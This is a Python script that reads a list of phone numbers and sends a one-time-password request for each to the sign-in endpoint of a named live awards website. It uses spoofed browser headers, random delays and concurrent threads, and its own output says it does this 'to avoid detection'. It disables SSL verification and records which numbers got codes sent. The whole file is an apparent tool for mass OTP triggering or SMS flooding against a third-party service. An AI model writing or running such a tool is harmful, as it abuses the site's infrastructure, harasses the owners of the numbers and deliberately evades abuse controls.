import requests
import time
import random
import json
from fake_useragent import UserAgent
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

class SmartOTPTester:
    def __init__(self):
        self.ua = UserAgent()
        self.session = requests.Session()
        self.successful = []
        self.failed = []
        self.lock = threading.Lock()
        
        # Remove SSL warnings
        requests.packages.urllib3.disable_warnings(
            requests.packages.urllib3.exceptions.InsecureRequestWarning
        )
    
    def analyze_api(self):
        """First analyze the API to understand its requirements"""
        print("🔍 Analyzing API requirements...")
        
        test_url = "https://pack.chromaawards.com/otp"
        test_phone = "+2250700000000"  # Test number
        
        # Try different payload formats
        test_payloads = [
            {"phoneNumber": test_phone},
            {"phone": test_phone},
            {"mobile": test_phone},
            {"number": test_phone},
            {"phone_number": test_phone},
        ]
        
        test_headers = {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "origin": "https://pack.chromaawards.com",
            "referer": "https://pack.chromaawards.com/sign-in",
        }
        
        for i, payload in enumerate(test_payloads):
            try:
                print(f"Testing payload format {i+1}...")
                response = requests.post(
                    test_url,
                    json=payload,
                    headers=test_headers,
                    verify=False,
                    timeout=10
                )
                print(f"Status: {response.status_code}, Response: {response.text[:100]}")
                
                if response.status_code == 200:
                    print(f"✅ Found working payload format: {payload}")
                    return payload.keys()
                    
            except Exception as e:
                print(f"Error with payload {i+1}: {e}")
        
        print("⚠️ Using default payload format")
        return ["phoneNumber"]
    
    def get_smart_headers(self):
        """Generate smart headers that match the website exactly"""
        return {
            "accept": "application/json, text/plain, */*",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "origin": "https://pack.chromaawards.com",
            "referer": "https://pack.chromaawards.com/sign-in",
            "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
        }
    
    def make_careful_request(self, phone):
        """Make a carefully crafted request that matches the website behavior"""
        url = "https://pack.chromaawards.com/otp"
        
        # Use the exact payload format the website expects
        payload = {"phoneNumber": f"+{phone}"}
        
        headers = self.get_smart_headers()
        
        try:
            # Add realistic delay
            time.sleep(random.uniform(1, 2))
            
            response = self.session.post(
                url,
                json=payload,
                headers=headers,
                verify=False,  # Disable SSL verification to avoid warnings
                timeout=15,
                allow_redirects=True
            )
            
            return self.analyze_response(response, phone)
            
        except requests.exceptions.RequestException as e:
            return False, f"Network error: {str(e)}"
        except Exception as e:
            return False, f"Unexpected error: {str(e)}"
    
    def analyze_response(self, response, phone):
        """Carefully analyze the API response"""
        print(f"📡 Response for +{phone}: Status {response.status_code}")
        
        if response.status_code == 200:
            try:
                response_data = response.json()
                print(f"   Response data: {response_data}")
                
                # Check for various success patterns
                if isinstance(response_data, dict):
                    if response_data.get('success') is True:
                        return True, "SUCCESS - API returned success"
                    elif response_data.get('message') and any(word in response_data['message'].lower() for word in ['sent', 'success', 'otp']):
                        return True, "SUCCESS - Message indicates success"
                    elif response_data.get('status') == 'success':
                        return True, "SUCCESS - Status is success"
                    elif not response_data.get('error'):
                        return True, "SUCCESS - No error in response"
                
                # If we can't parse JSON but got 200, assume success
                return True, "SUCCESS - 200 status code"
                
            except json.JSONDecodeError:
                # If it's not JSON but got 200, check text
                if any(word in response.text.lower() for word in ['success', 'sent', 'otp']):
                    return True, "SUCCESS - Text indicates success"
                return True, "SUCCESS - 200 status code"
        
        elif response.status_code == 400:
            # Analyze what kind of 400 error
            try:
                error_data = response.json()
                error_msg = error_data.get('message', error_data.get('error', 'Unknown 400 error'))
                return False, f"BAD_REQUEST - {error_msg}"
            except:
                return False, f"BAD_REQUEST - {response.text[:100]}"
        
        elif response.status_code == 429:
            return False, "RATE_LIMITED"
        
        elif response.status_code == 403:
            return False, "FORBIDDEN - Access denied"
        
        else:
            return False, f"HTTP_{response.status_code} - {response.text[:100]}"
    
    def test_single_number(self, phone):
        """Test single phone number with detailed logging"""
        full_phone = f"+{phone}"
        
        try:
            success, message = self.make_careful_request(phone)
            
            with self.lock:
                if success:
                    print(f"✅ SUCCESS: {full_phone}")
                    self.successful.append(phone)
                else:
                    print(f"❌ FAILED: {full_phone} - {message}")
                    self.failed.append(phone)
                    
            return success
            
        except Exception as e:
            with self.lock:
                print(f"⚠️ ERROR: {full_phone} - {str(e)}")
                self.failed.append(phone)
            return False
    
    def run_smart_test(self, numbers, max_workers=3):
        """Run smart testing with controlled concurrency"""
        print(f"🚀 Testing {len(numbers)} numbers with {max_workers} workers...")
        print("⏳ Using careful approach to avoid detection...")
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_phone = {
                executor.submit(self.test_single_number, phone): phone 
                for phone in numbers
            }
            
            for future in as_completed(future_to_phone):
                phone = future_to_phone[future]
                try:
                    future.result()
                except Exception as exc:
                    print(f'❌ {phone} generated exception: {exc}')
    
    def save_results(self):
        """Save results to files"""
        timestamp = int(time.time())
        
        # Update numbers.txt with only failed numbers
        remaining_numbers = list(set(self.failed) - set(self.successful))
        with open("numbers.txt", "w") as f:
            for num in remaining_numbers:
                f.write(f"{num}\n")
        
        # Save successful numbers
        if self.successful:
            with open(f"success_{timestamp}.txt", "w") as f:
                for num in self.successful:
                    f.write(f"{num}\n")
        
        # Save detailed report
        with open(f"report_{timestamp}.txt", "w") as f:
            f.write(f"OTP Test Report - {time.ctime()}\n")
            f.write("="*50 + "\n")
            f.write(f"Total Tested: {len(self.successful) + len(self.failed)}\n")
            f.write(f"Successful: {len(self.successful)}\n")
            f.write(f"Failed: {len(self.failed)}\n")
            f.write(f"Remaining: {len(remaining_numbers)}\n")
            f.write(f"Success Rate: {(len(self.successful)/(len(self.successful)+len(self.failed))*100 if (len(self.successful)+len(self.failed)) > 0 else 0):.1f}%\n\n")
            
            if self.successful:
                f.write("SUCCESSFUL NUMBERS:\n")
                for num in self.successful:
                    f.write(f"+{num}\n")
            
            if self.failed:
                f.write("\nFAILED NUMBERS:\n")
                for num in self.failed:
                    f.write(f"+{num}\n")

def main():
    """Main function"""
    tester = SmartOTPTester()
    
    # Read numbers
    try:
        with open("numbers.txt", "r") as f:
            numbers = [line.strip() for line in f.readlines() if line.strip()]
    except FileNotFoundError:
        print("❌ ERROR: numbers.txt not found!")
        print("Create numbers.txt with phone numbers (one per line, without +)")
        return
    
    if not numbers:
        print("❌ No numbers found in numbers.txt!")
        return
    
    print(f"📱 Loaded {len(numbers)} numbers for testing")
    
    # First analyze the API
    print("\n🔍 Phase 1: API Analysis")
    tester.analyze_api()
    
    # Test configuration - use fewer workers for careful testing
    max_workers = min(2, len(numbers))
    
    # Run tests
    print(f"\n🚀 Phase 2: Testing Numbers")
    start_time = time.time()
    tester.run_smart_test(numbers, max_workers)
    end_time = time.time()
    
    # Save results
    tester.save_results()
    
    # Display summary
    print(f"\n{'='*50}")
    print("🎯 TEST SUMMARY")
    print(f"{'='*50}")
    print(f"Total Numbers: {len(numbers)}")
    print(f"Successful: {len(tester.successful)}")
    print(f"Failed: {len(tester.failed)}")
    print(f"Success Rate: {(len(tester.successful)/len(numbers)*100):.1f}%")
    print(f"Time Taken: {end_time - start_time:.1f} seconds")
    
    if tester.successful:
        print(f"\n✅ SUCCESSFUL NUMBERS:")
        for phone in tester.successful[:10]:
            print(f"  +{phone}")
        if len(tester.successful) > 10:
            print(f"  ... and {len(tester.successful) - 10} more")
    
    # Show common failure reasons
    if tester.failed:
        print(f"\n❌ Common failure reasons logged in report file")

if __name__ == "__main__":
    # Check and install required packages
    try:
        import fake_useragent
    except ImportError:
        print("Installing required packages...")
        import subprocess
        subprocess.check_call(["pip", "install", "fake-useragent", "requests"])
    
    main()
